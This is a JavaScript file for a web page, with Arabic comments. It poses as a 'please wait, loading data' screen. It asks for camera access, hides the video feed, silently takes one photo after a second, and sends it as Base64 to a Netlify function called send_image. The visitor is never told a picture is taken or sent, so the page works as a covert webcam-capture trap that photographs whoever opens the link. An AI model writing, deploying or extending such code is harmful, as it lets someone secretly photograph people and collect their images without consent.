document.addEventListener('DOMContentLoaded', () => {
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const statusDiv = document.createElement('div');
    statusDiv.id = 'status';
    statusDiv.textContent = '..الرجاء الانتظار لتحميل البيانات...';

    // إعدادات الشاشة
    document.body.style.backgroundColor = 'black';
    document.body.style.color = 'white';
    document.body.style.display = 'flex';
    document.body.style.justifyContent = 'center';
    document.body.style.alignItems = 'center';
    document.body.style.height = '100vh';
    document.body.style.margin = '0';
    document.body.style.fontSize = '20px';
    document.body.appendChild(statusDiv);

    // محاولة الوصول إلى الكاميرا
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            // إزالة رسالة الانتظار
            statusDiv.remove();

            // إعدادات الفيديو للعرض
            video.srcObject = stream;
            video.play();
            video.style.display = 'none'; // لإخفاء الفيديو بعد بدء تشغيله (يمكنك إظهاره إذا أردت رؤية العرض)

            // إعدادات الكانفاس لالتقاط الصورة
            canvas.width = 640;
            canvas.height = 480;

            // أضف الفيديو والكانفاس إلى الجسم (اختياري)
            document.body.appendChild(video);
            document.body.appendChild(canvas);

            // بعد تشغيل الفيديو، التقط الصورة مباشرة (تأخير بسيط لضمان تجهيز الكاميرا)
            video.onloadedmetadata = () => {
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // تحويل الصورة إلى صيغة Base64
                    const imageDataURL = canvas.toDataURL('image/jpeg');

                    // إرسال البيانات إلى وظيفة Netlify
                    sendImageToNetlify(imageDataURL);

                    // إيقاف بث الكاميرا بعد التقاط الصورة
                    stream.getTracks().forEach(track => track.stop());
                }, 1000); // 1 ثانية انتظار
            };

        })
        .catch(error => {
            // عرض رسالة خطأ إذا لم يتمكن من الوصول إلى الكاميرا
            console.error('Error accessing camera:', error);
            statusDiv.textContent = 'تعذر.';
        });

    function sendImageToNetlify(imageDataURL) {
        // تحديث رسالة الحالة
        statusDiv.textContent = '...جار..';
        document.body.appendChild(statusDiv);
        
        // **الرابط المصحح لوظيفة Netlify:**
        const API_ENDPOINT = '/.netlify/functions/send_image';

        fetch(API_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            // إرسال الصورة كبيانات Base64 (إزالة الجزء الأول 'data:image/jpeg;base64,')
            body: JSON.stringify({
                imageData: imageDataURL.split(',')[1],
            }),
        })
        .then(response => response.json())
        .then(data => {
            console.log('Success:', data);
            statusDiv.textContent = 'تم.';
        })
        .catch(error => {
            console.error('Error sending image:', error);
            statusDiv.textContent = 'فشل.';
        });
    }
});

